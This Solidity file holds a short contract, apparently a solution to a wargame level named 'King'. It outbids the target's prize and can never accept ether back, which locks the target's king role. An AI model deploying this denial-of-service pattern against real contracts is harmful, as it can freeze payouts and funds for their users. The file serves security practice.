// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IKing {
  function prize() external view returns(uint);
}
contract KingSolution {

  function breakIt(IKing king) external payable {
    uint newPrize = king.prize() + 1;
    require(msg.value >= newPrize, "Not enough value for new prize");
    (bool sent, bytes memory data)  = payable(address(king)).call{value: newPrize}("");
    require(sent, "Unsuccessful");
    payable(msg.sender).transfer(msg.value - newPrize);
  }

}
